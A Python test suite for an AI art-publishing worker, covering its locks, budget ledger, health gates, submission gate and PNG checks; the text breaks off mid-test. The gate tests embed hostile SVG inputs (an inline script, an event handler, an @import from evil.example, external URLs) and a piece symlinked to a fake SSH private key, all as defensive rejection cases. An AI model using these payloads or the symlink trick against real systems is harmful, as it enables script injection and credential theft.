"""test_evolve_worker.py — the guarantees the art arm is not allowed to lose.

Every test here is a thing that, if it broke silently, would look exactly like
success: a second worker doubling the spend, a corrupt ledger handing back the
day's budget, a model committing its own work, a nine-candidate "cycle", a
timeout that texted a paintbrush. Mocks and temp git repos only — nothing here
touches the live instance, GitHub, or a model.
"""

import copy
import json
import hashlib
import os
import re
import shutil
import signal
import struct
import subprocess
import sys
import time
import unittest
import uuid
import zlib
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

import evolve_worker as EW
import sentinel
import subsentinels as SS

SCRATCH = Path(__file__).resolve().parent / ".tmp-evolve-worker-tests"
# Captured before any test patches it: ArtDeliveryTests puts the REAL notify
# back so it can watch the genuine path reach the genuine queue.
REAL_NOTIFY = sentinel.notify
REAL_PNG_PROBE = EW.probe_png_url
NOW = datetime(2026, 8, 17, 22, 0, tzinfo=timezone.utc)


def _history_snapshot():
    """What the ledger held at the moment a notification was sent."""
    try:
        return json.loads(EW.HISTORY_PATH.read_text(encoding="utf-8"))
    except Exception:
        return []


def scratch_dir(name):
    SCRATCH.mkdir(exist_ok=True)
    path = SCRATCH / f"{name}-{uuid.uuid4().hex[:8]}"
    path.mkdir(parents=True)
    return path


def git(cwd, *args):
    """Harness git, run in the sanitized environment.

    The hostile-environment tests deliberately poison os.environ; the harness
    that builds and inspects the fixtures must not be poisoned with it, or the
    test measures the harness instead of the controller.
    """
    r = subprocess.run(["git", *args], cwd=str(cwd), capture_output=True,
                       text=True, env=EW.controller_git_env())
    if r.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {r.stderr}")
    return r.stdout


def git_bare(bare, *args):
    """This machine sets safe.bareRepository=explicit, so say --git-dir."""
    bare = Path(bare)
    return git(bare.parent, f"--git-dir={bare}", *args)


SVG = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
       '<circle cx="5" cy="5" r="4"/></svg>')

TRUSTED_COLLECTIVE_VALIDATOR = """#!/usr/bin/env python3
import json
import sys
from pathlib import Path

if sys.argv[1:] != ["--validate"]:
    print("expected --validate", file=sys.stderr)
    raise SystemExit(2)
submissions = Path(__file__).resolve().parents[1] / "submissions"
count = 0
for directory in sorted(path for path in submissions.iterdir() if path.is_dir()):
    json.loads(directory.joinpath("meta.json").read_text(encoding="utf-8"))
    count += 1
print(f"all submissions valid ({count} submissions)")
"""


def png_chunk(kind, payload, crc=None):
    body = kind + payload
    checksum = zlib.crc32(body) & 0xFFFFFFFF if crc is None else crc
    return struct.pack(">I", len(payload)) + body + struct.pack(">I", checksum)


def real_png(width=512, height=512, color_type=6, compressed=None):
    channels = 3 if color_type == 2 else 4
    ihdr = struct.pack(
        ">IIBBBBB", width, height, 8, color_type, 0, 0, 0)
    if compressed is None:
        pixel = b"\x35\x78\xa0" + (b"\xff" if channels == 4 else b"")
        scanline = b"\x00" + pixel * width
        compressed = zlib.compress(scanline * height, level=9)
    return (EW.azure_art.PNG_SIGNATURE
            + png_chunk(b"IHDR", ihdr)
            + png_chunk(b"IDAT", compressed)
            + png_chunk(b"IEND", b""))


PNG = real_png()

COLLECTIVE_RECEIPT_FIXTURE = json.loads(
    Path(__file__).with_name("fixtures")
    .joinpath("collective-reviewed-png-receipt.json")
    .read_text(encoding="utf-8"))

COLLECTIVE_CONTROLLER_CONTRACT_FIXTURE = (
    Path(__file__).with_name("fixtures")
    .joinpath("collective-reviewed-png-controller-contract.json"))


def collective_controller_contract():
    return json.loads(
        COLLECTIVE_CONTROLLER_CONTRACT_FIXTURE.read_text(encoding="utf-8"))


def collective_verifier_path():
    worktrees = Path(__file__).resolve().parent.parent
    preferred = (
        worktrees / "public-art-png-gate-20260821"
        / "tools" / "verify_png_attestation.py")
    candidates = [preferred]
    candidates.extend(
        sorted(worktrees.glob("public-art-*/tools/verify_png_attestation.py")))
    return next((path for path in candidates if path.is_file()), None)


def require_collective_verifier(test_case, context):
    verifier = collective_verifier_path()
    if verifier is None:
        test_case.skipTest(
            "real sibling Collective verify_png_attestation.py is "
            f"unavailable for {context}"
        )
    return verifier


def reviewed_png_wcfg(home, explicit=True):
    block = {
        "allowed_kinds": ["png"],
        "max_piece_bytes": 10 * 1024 * 1024,
        "azure_image": {
            "enabled": True,
            "endpoint": "https://dada.example.openai.azure.com",
            "deployment": "gpt-image-2",
            "fallback_deployment": "gpt-image-2",
            "max_attempts": 2,
            "minimum_review_score": 8,
            "review_model": "gpt-5.4",
        },
        "rapp_vision": {
            "enabled": True,
            "repo": str(Path(home) / "vision"),
        },
    }
    if explicit:
        block["publication_profile"] = EW.AZURE_REVIEWED_PNG_PROFILE
    return EW.worker_config({"evolve_worker": block})


def dada_cycle(slug, cycle=1, previous=None, rounds=1,
               candidates=EW.CANDIDATES_PER_ROUND,
               dimensions=EW.SCORE_DIMENSIONS, round1_records=None):
    body = []
    for r in range(1, rounds + 1):
        if r == 1 and round1_records:
            cands = [dict(rec) for rec in round1_records]
        else:
            cands = [{"id": f"r{r}c{i}", "premise": f"premise {r}.{i}",
                      "scores": {d: 5 for d in dimensions}}
                     for i in range(1, candidates + 1)]
        body.append({"round": r, "candidates": cands,
                     "selected": cands[0]["id"] if cands else None})
    return {
        "cycle": cycle,
        "previous_slug": previous,
        "rounds": body,
        "winner": {"round": rounds,
                   "candidate": body[-1]["selected"] if body else None,
                   "slug": slug},
    }


def meta_for(slug, cycle=1, previous=None, round1_records=None, **overrides):
    meta = {
        "schema": EW.SUBMISSION_SCHEMA,
        "title": slug.replace("-", " ").title(),
        "slug": slug,
        "contributor": "kody-w",
        "kind": "svg",
        "submitted_at": "2026-08-17T22:00:00Z",
        "remix_of": None,
        "license": "CC0-1.0",
        "_dada_cycle": dada_cycle(slug, cycle=cycle, previous=previous,
                                  round1_records=round1_records),
    }
    meta.update(overrides)
    return meta


def with_reviewed_png_receipt(meta, image, wcfg):
    snapshot = EW.publication_profile_snapshot(wcfg)
    info = EW._check_png(image)
    result = dict(meta)
    result["_image_generation"] = {
        "schema": EW.IMAGE_GENERATION_SCHEMA,
        "profile": EW.AZURE_REVIEWED_PNG_PROFILE,
        "provider": EW.IMAGE_PROVIDER,
        "deployment": snapshot["deployments"][0],
        "attempts": 1,
        "image_sha256": hashlib.sha256(image).hexdigest(),
        "image": {"width": info["width"], "height": info["height"]},
        "review": {
            "schema": EW.IMAGE_REVIEW_SCHEMA,
            "model": snapshot["review_model"],
            "publish": True,
            "score": 9,
            "minimum_score": snapshot["minimum_review_score"],
            "failures": [],
            "strengths": ["clear visual hierarchy"],
        },
    }
    return result


def write_submission(root, slug, meta=None, piece=SVG, piece_name="piece.svg"):
    """Write into the FIXED output directory the controller precreates.

    `root` is a staging `out/` (the maker's world, where the slug lives only
    in meta.json because nothing in its toolset can create a directory), or a
    seed repository, where a slug still names a folder.
    """
    root = Path(root)
    directory = (root / EW.SUBMISSION_DIR if root.name == "out"
                 else root / "submissions" / slug)
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "meta.json").write_text(
        json.dumps(meta if meta is not None else meta_for(slug), indent=2),
        encoding="utf-8")
    (directory / piece_name).write_text(piece, encoding="utf-8")
    return directory


class ScratchCase(unittest.TestCase):
    """A worker whose entire durable footprint lives in a scratch directory."""

    def setUp(self):
        self.home = scratch_dir(self.__class__.__name__)
        self.state = self.home / "state"
        self.logs = self.home / "logs"
        self.state.mkdir()
        self.logs.mkdir()
        patches = {
            "HOME": self.home,
            "STATE": self.state,
            "LOGS": self.logs,
            "STOP": self.home / "STOP",
            "LOCK_PATH": self.state / "evolve-worker.lock",
            "HISTORY_PATH": self.state / "evolve-worker-history.json",
            "TURN_PATH": self.state / "evolve-worker-turn.json",
            "ALERT_PATH": self.state / "evolve-worker-alerts.json",
            "STATUS_PATH": self.state / "evolve-worker-status.json",
            "TRANSACTION_PATH": self.state / "evolve-worker-transaction.json",
            "ART_ARCHIVE": self.state / "art",
        }
        for name, value in patches.items():
            p = mock.patch.object(EW, name, value)
            p.start()
            self.addCleanup(p.stop)
        # No test may reach the network: every view-url probe answers 200
        # unless a test says otherwise.
        self.probes = []

        def fake_probe(url, timeout=10):
            self.probes.append(url)
            return (self.probe_answer(url), "HTTP 200")
        self.probe_answer = lambda url: True
        p = mock.patch.object(EW, "probe_url", fake_probe)
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(EW, "probe_png_url", fake_probe)
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(EW.time, "sleep", lambda *_: None)
        p.start()
        self.addCleanup(p.stop)

        self.notifications = []
        p = mock.patch.object(
            EW.sentinel, "notify",
            side_effect=lambda cfg, text, to=None, rebuild=False, **options:
            self.notifications.append({"text": text, "to": to,
                                       "rebuild": rebuild,
                                       **options,
                                       "history": _history_snapshot()}))
        p.start()
        self.addCleanup(p.stop)
        self.frames = []
        p = mock.patch.object(EW.NB, "emit",
                              side_effect=lambda slug, kind, payload:
                              self.frames.append((slug, kind, payload)))
        p.start()
        self.addCleanup(p.stop)

    def texts(self):
        return [n["text"] for n in self.notifications]

    def tearDown(self):
        shutil.rmtree(self.home, ignore_errors=True)


# ── lock ────────────────────────────────────────────────────────────────────

class LockTests(ScratchCase):
    def test_a_second_worker_cannot_take_the_lock(self):
        first = EW.acquire_lock()
        self.addCleanup(EW.release_lock, first)
        self.assertIsNotNone(first)
        self.assertIsNone(EW.acquire_lock(),
                          "a second pass must not run while one is in flight")

    def test_the_lock_is_reusable_once_released(self):
        first = EW.acquire_lock()
        EW.release_lock(first)
        second = EW.acquire_lock()
        self.addCleanup(EW.release_lock, second)
        self.assertIsNotNone(second)

    def test_a_held_lock_skips_the_pass_without_spending(self):
        held = EW.acquire_lock()
        self.addCleanup(EW.release_lock, held)
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("lock", summary["reason"])
        model.assert_not_called()


# ── cadence and budget ──────────────────────────────────────────────────────

class CadenceBudgetTests(ScratchCase):
    def rows(self, *ages_h, **extra):
        return [{"at": (NOW - timedelta(hours=h)).isoformat(),
                 "mode": "evolve", **extra} for h in ages_h]

    def test_first_evolution_is_allowed(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, why = EW.cadence_ready([], {"interval_hours": 4})
        self.assertTrue(ready)
        self.assertEqual("first evolution", why)

    def test_recent_evolution_waits_for_the_global_cadence(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, why = EW.cadence_ready(self.rows(2), {"interval_hours": 4})
        self.assertFalse(ready)
        self.assertIn("2.0h of 4.0h", why)

    def test_cadence_is_global_across_roles(self):
        history = [{"at": (NOW - timedelta(hours=1)).isoformat(),
                    "mode": "evolve", "role": "scout"}]
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, _ = EW.cadence_ready(history, {"interval_hours": 4})
        self.assertFalse(ready, "another role's run still consumes the cadence")

    def test_budget_is_a_rolling_24h_window(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ok, used, cap = EW.within_budget(self.rows(1, 5), {"daily_budget": 2})
            self.assertFalse(ok)
            self.assertEqual((2, 2), (used, cap))
            ok, used, _ = EW.within_budget(self.rows(1, 30), {"daily_budget": 2})
        self.assertTrue(ok)
        self.assertEqual(1, used, "a row older than 24h is out of the window")

    def test_skipped_rows_never_consume_the_budget(self):
        history = self.rows(1, 2, 3, skipped=True)
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ok, used, _ = EW.within_budget(history, {"daily_budget": 2})
        self.assertTrue(ok)
        self.assertEqual(0, used)

    def test_a_spent_budget_skips_before_the_model(self):
        EW.save_history([{"at": NOW.isoformat(), "mode": "evolve"}])
        with mock.patch.object(EW.sentinel, "now", return_value=NOW), \
             mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(daily_evolve_budget=1),
                                  health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("budget spent", summary["reason"])
        model.assert_not_called()


# ── fail-closed ledgers ─────────────────────────────────────────────────────

class CorruptLedgerTests(ScratchCase):
    def test_corrupt_history_raises_instead_of_reading_as_no_spend(self):
        EW.HISTORY_PATH.write_text("{not json", encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_empty_history_is_unknown_not_zero(self):
        EW.HISTORY_PATH.write_text("   ", encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_a_row_with_an_unparseable_timestamp_fails_closed(self):
        EW.HISTORY_PATH.write_text(json.dumps([{"at": "yesterday", "mode": "evolve"}]),
                                   encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_a_missing_history_is_simply_zero_spend(self):
        self.assertEqual([], EW.load_history())

    def test_corrupt_history_stops_the_pass_and_preserves_the_bytes(self):
        raw = '[{"at": "2026-08-17T21:00:00+00:00", "mode": "evolve"'
        EW.HISTORY_PATH.write_text(raw, encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        model.assert_not_called()
        self.assertEqual(raw, EW.HISTORY_PATH.read_text(encoding="utf-8"),
                         "a corrupt ledger must never be rewritten as empty")
        self.assertTrue(self.notifications, "fail-closed must be said out loud")
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])

    def test_corrupt_creative_state_fails_closed_before_the_model(self):
        (self.state / "evolve-creative-state.json").write_text("{;", encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        model.assert_not_called()

    def test_atomic_write_leaves_no_partial_file_behind(self):
        target = self.state / "ledger.json"
        EW.atomic_write_json(target, [{"at": "now"}])
        self.assertEqual([{"at": "now"}], json.loads(target.read_text()))
        leftovers = [p.name for p in self.state.iterdir() if p.name.startswith(".")]
        self.assertEqual([], leftovers)


# ── health gates ────────────────────────────────────────────────────────────

class HealthGateTests(unittest.TestCase):
    def test_critical_always_aborts(self):
        ok, why = EW.health_gate({"degraded_allowlist": ["rb_workflows"]},
                                 {"status": "critical", "critical": ["rb_workflows"],
                                  "failed": ["rb_workflows"]})
        self.assertFalse(ok)
        self.assertIn("critical", why)

    def test_degraded_needs_every_failing_id_allowlisted(self):
        cfg = {"degraded_allowlist": ["w_openrappter_spin"]}
        ok, why = EW.health_gate(cfg, {"status": "degraded", "critical": [],
                                       "failed": ["w_openrappter_spin"]})
        self.assertTrue(ok)
        ok, why = EW.health_gate(cfg, {"status": "degraded", "critical": [],
                                       "failed": ["w_openrappter_spin", "rb_shards"]})
        self.assertFalse(ok)
        self.assertIn("rb_shards", why)

    def test_evolve_on_degraded_is_not_a_blanket_switch_here(self):
        ok, _ = EW.health_gate({"evolve_on_degraded": True, "degraded_allowlist": []},
                               {"status": "degraded", "critical": [],
                                "failed": ["rb_shards"]})
        self.assertFalse(ok, "the worker must ignore evolve_on_degraded")

    def test_a_blind_health_run_is_not_healthy(self):
        ok, _ = EW.health_gate({"degraded_allowlist": ["w_openrappter_spin"]},
                               {"status": "degraded", "critical": [],
                                "failed": ["health_runtime"]})
        self.assertFalse(ok)

    def test_healthy_passes(self):
        ok, _ = EW.health_gate({}, healthy())
        self.assertTrue(ok)

    def test_alert_delivery_cannot_be_allowlisted(self):
        # Since 232ce7e an unverifiable or dead-lettered send fails this check
        # instead of passing optimistically. Art must not outrun the channel
        # that would report it.
        verdict = {"status": "degraded", "critical": [],
                   "failed": ["alert_delivery"]}
        for allowlist in ([], ["alert_delivery"],
                          ["alert_delivery", "w_openrappter_spin"]):
            with self.subTest(allowlist=allowlist):
                ok, why = EW.health_gate({"degraded_allowlist": allowlist}, verdict)
                self.assertFalse(ok, "unverified/dead-letter alerts block new art")
                self.assertIn("alert_delivery", why)
                self.assertIn("cannot be allowlisted", why)

    def test_a_blind_health_run_cannot_be_allowlisted_either(self):
        ok, why = EW.health_gate({"degraded_allowlist": ["health_runtime"]},
                                 {"status": "degraded", "critical": [],
                                  "failed": ["health_runtime"]})
        self.assertFalse(ok)
        self.assertIn("cannot be allowlisted", why)

    def test_the_unskippable_set_is_exactly_what_it_claims(self):
        self.assertEqual({"alert_delivery", "health_runtime"},
                         set(EW.NEVER_ALLOWLISTABLE))

    def test_alert_delivery_blocks_even_beside_allowlisted_noise(self):
        ok, why = EW.health_gate(
            {"degraded_allowlist": ["w_openrappter_spin", "alert_delivery"]},
            {"status": "degraded", "critical": [],
             "failed": ["w_openrappter_spin", "alert_delivery"]})
        self.assertFalse(ok)
        self.assertIn("alert_delivery", why)


# ── the deterministic gate ──────────────────────────────────────────────────

class GateTests(ScratchCase):
    """The staging gate: a submission tree with no git anywhere near it."""

    def setUp(self):
        super().setUp()
        self.staging = self.home / "staging"
        EW.prepare_staging(self.staging)
        self.out = self.staging / "out"
        self.submission_dir = self.out / EW.SUBMISSION_DIR
        self.wcfg = EW.worker_config({})
        self.known = {"already-here"}

    def gate(self, cycle=2, previous="already-here", round1=None):
        EW.assert_no_git(self.staging)
        return EW.gate_directory(self.out, self.wcfg, cycle, previous, round1,
                                 self.known)

    def submit(self, slug="new-piece", meta=None, **kwargs):
        return write_submission(
            self.out, slug,
            meta if meta is not None else meta_for(slug, cycle=2,
                                                   previous="already-here"),
            **kwargs)

    def test_a_clean_submission_passes(self):
        self.submit()
        result = self.gate()
        self.assertEqual("new-piece", result["slug"])
        self.assertEqual("submissions/new-piece/piece.svg", result["piece_path"])
        self.assertEqual(SVG.encode(), result["piece_bytes"])

    def test_an_empty_output_directory_is_a_decline_shaped_rejection(self):
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("no new submission", str(cm.exception))

    def test_a_second_directory_is_rejected(self):
        self.submit()
        (self.out / "another").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("may not create paths", str(cm.exception))

    def test_a_hidden_probe_file_is_rejected(self):
        # exactly what the live cycle left behind when it could not mkdir
        self.submit()
        (self.submission_dir / ".probe").write_text("", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("hidden file", str(cm.exception))

    def test_the_slug_comes_from_meta_not_a_directory_name(self):
        self.submit(meta=meta_for("named-in-meta", cycle=2,
                                  previous="already-here"))
        result = self.gate()
        self.assertEqual("named-in-meta", result["slug"])
        self.assertEqual("submissions/named-in-meta/meta.json",
                         result["meta_path"])

    def test_a_bad_slug_in_meta_is_rejected(self):
        self.submit(meta=meta_for("Not A Slug", cycle=2,
                                  previous="already-here"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("meta.slug", str(cm.exception))

    def test_anything_beside_the_fixed_directory_is_rejected(self):
        self.submit()
        (self.out / "notes.md").write_text("hi", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("may not create paths", str(cm.exception))

    def test_a_third_file_in_the_folder_is_rejected(self):
        directory = self.submit()
        (directory / "notes.txt").write_text("extra", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("meta.json + piece", str(cm.exception))

    def test_a_colliding_slug_is_rejected(self):
        self.submit(meta=meta_for("already-here", cycle=2,
                                  previous="already-here"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("already exists", str(cm.exception))

    def test_a_git_directory_in_staging_is_rejected(self):
        self.submit()
        (self.staging / ".git").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn(".git", str(cm.exception))

    def test_a_git_file_inside_the_submission_is_rejected(self):
        directory = self.submit()
        (directory / ".git").write_text("gitdir: /somewhere/else", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn(".git", str(cm.exception))

    def test_extension_must_match_kind(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  kind="md"), piece_name="piece.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("piece.md", str(cm.exception))

    def test_instance_can_require_visual_svg_output(self):
        self.wcfg["allowed_kinds"] = ["svg"]
        self.submit(meta=meta_for("new-piece", cycle=2,
                                  previous="already-here", kind="txt"),
                    piece="plain text", piece_name="piece.txt")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("requires svg", str(cm.exception))

    def test_unknown_license_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  license="MIT"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("license", str(cm.exception))


    def test_wrong_schema_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  schema="rapp-art-submission/2.0"))
        with self.assertRaises(EW.GateError):
            self.gate()

    def test_unknown_top_level_meta_key_is_rejected(self):
        meta = meta_for("new-piece", cycle=2, previous="already-here")
        meta["price"] = 100
        self.submit(meta=meta)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("unknown keys", str(cm.exception))

    def test_an_unknown_remix_target_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  remix_of="never-existed"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("remix_of", str(cm.exception))

    def test_an_oversized_piece_is_rejected(self):
        big = ('<svg xmlns="http://www.w3.org/2000/svg">'
               + "<!--" + "x" * 60000 + "-->" + "</svg>")
        self.submit(piece=big)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("byte cap", str(cm.exception))

    def test_svg_with_a_script_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<script>alert(1)</script></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("script", str(cm.exception))

    def test_svg_with_an_event_attribute_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle onclick="x()" r="1"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("event attribute", str(cm.exception))

    def test_svg_with_an_external_reference_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<image href="https://example.com/a.png"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("outside itself", str(cm.exception))

    def test_svg_with_an_external_css_reference_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<style>@import url(https://evil.example/x.css);'
                          '</style><circle r="1"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("@import", str(cm.exception))

    def test_svg_with_an_external_fill_url_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle r="1" fill="url(https://x.example/a.svg#g)"/>'
                          '</svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("outside itself", str(cm.exception))

    def test_a_fragment_url_reference_is_allowed(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle r="1" fill="url(#grad)"/>'
                          '<use href="#grad"/></svg>')
        self.assertEqual("new-piece", self.gate()["slug"])

    def test_unparseable_svg_is_rejected(self):
        self.submit(piece="<svg><circle></svg>")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("parse", str(cm.exception))

    def test_a_nested_directory_in_the_output_is_rejected(self):
        directory = self.submit()
        (directory / "extra").mkdir()
        (directory / "extra" / "more.svg").write_text(SVG, encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("not a regular file", str(cm.exception))

    def test_a_symlinked_piece_is_rejected(self):
        directory = self.submission_dir
        (directory / "meta.json").write_text(
            json.dumps(meta_for("new-piece", cycle=2, previous="already-here")),
            encoding="utf-8")
        secret = self.home / "id_ed25519"
        secret.write_text("PRIVATE KEY", encoding="utf-8")
        (directory / "piece.svg").symlink_to(secret)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("symlink", str(cm.exception))

    def test_a_symlinked_output_folder_is_rejected(self):
        elsewhere = self.home / "elsewhere"
        elsewhere.mkdir()
        shutil.rmtree(self.submission_dir)
        self.submission_dir.symlink_to(elsewhere)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("symlink", str(cm.exception))

    def test_a_hardlinked_piece_is_rejected(self):
        directory = self.submit()
        os.link(directory / "piece.svg", self.home / "second-name.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("hard link", str(cm.exception))

    def test_an_executable_piece_is_rejected(self):
        directory = self.submit()
        os.chmod(directory / "piece.svg", 0o755)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("executable", str(cm.exception))

    def test_a_fifo_is_rejected(self):
        directory = self.submission_dir
        (directory / "meta.json").write_text(
            json.dumps(meta_for("new-piece", cycle=2, previous="already-here")),
            encoding="utf-8")
        os.mkfifo(directory / "piece.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("not a regular file", str(cm.exception))


class DadaCycleTests(unittest.TestCase):
    """The 10-candidate invariant and its neighbours, checked directly."""

    def test_a_ten_candidate_round_passes(self):
        EW.validate_dada_cycle(dada_cycle("s", cycle=3, previous="p"),
                               "s", 3, "p")

    def test_nine_candidates_is_a_rejection(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", candidates=9), "s", 1, None)
        self.assertIn("exactly 10", str(cm.exception))

    def test_eleven_candidates_is_a_rejection(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", candidates=11), "s", 1, None)

    def test_one_short_round_among_many_is_caught(self):
        cycle = dada_cycle("s", rounds=3)
        cycle["rounds"][1]["candidates"].pop()
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("round 2", str(cm.exception))

    def test_rounds_must_be_between_one_and_five(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", rounds=6), "s", 1, None)
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", rounds=0), "s", 1, None)
        EW.validate_dada_cycle(dada_cycle("s", rounds=5), "s", 1, None)

    def test_exactly_six_named_score_dimensions(self):
        five = EW.SCORE_DIMENSIONS[:5]
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", dimensions=five), "s", 1, None)
        self.assertIn("scores", str(cm.exception))
        seven = EW.SCORE_DIMENSIONS + ("vibes",)
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", dimensions=seven), "s", 1, None)

    def test_scores_must_be_numbers_in_range(self):
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][3]["scores"]["craft"] = "high"
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][3]["scores"]["craft"] = 99
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)

    def test_duplicate_candidate_ids_are_rejected(self):
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][2]["id"] = "r1c1"
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("repeats", str(cm.exception))

    def test_the_winner_must_be_the_final_round_selection(self):
        cycle = dada_cycle("s", rounds=2)
        cycle["winner"]["candidate"] = "r2c9"
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("final round selected", str(cm.exception))

    def test_the_winner_must_name_the_submission(self):
        cycle = dada_cycle("s")
        cycle["winner"]["slug"] = "some-other-thing"
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)

    def test_cycle_continuity_is_enforced_in_both_directions(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", cycle=1, previous=None),
                                   "s", 4, "prior-slug")
        self.assertIn("continuity", str(cm.exception))
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", cycle=4, previous="wrong"),
                                   "s", 4, "prior-slug")
        EW.validate_dada_cycle(dada_cycle("s", cycle=4, previous="prior-slug"),
                               "s", 4, "prior-slug")

    def test_a_missing_cycle_block_is_a_rejection(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(None, "s", 1, None)


class PngValidationTests(unittest.TestCase):
    def test_real_rgb_and_rgba_pngs_are_fully_validated(self):
        rgba = EW._check_png(PNG)
        rgb = EW._check_png(real_png(color_type=2))
        self.assertEqual((512, 512, 4),
                         (rgba["width"], rgba["height"], rgba["channels"]))
        self.assertEqual(3, rgb["channels"])

    def test_header_only_and_missing_idat_pngs_are_rejected(self):
        header_only = (
            EW.azure_art.PNG_SIGNATURE + b"\x00\x00\x00\rIHDR"
            + struct.pack(">II", 512, 512) + b"\x08\x06\x00\x00\x00"
            + b"\x00\x00\x00\x00")
        ihdr = struct.pack(">IIBBBBB", 512, 512, 8, 6, 0, 0, 0)
        missing_idat = (
            EW.azure_art.PNG_SIGNATURE + png_chunk(b"IHDR", ihdr)
            + png_chunk(b"IEND", b""))
        for candidate in (header_only, missing_idat):
            with self.subTest(size=len(candidate)), \
                 self.assertRaises(EW.GateError):
                EW._check_png(candidate)

    def test_bad_crc_truncated_and_oversized_chunks_are_rejected(self):
        bad_crc = bytearray(PNG)
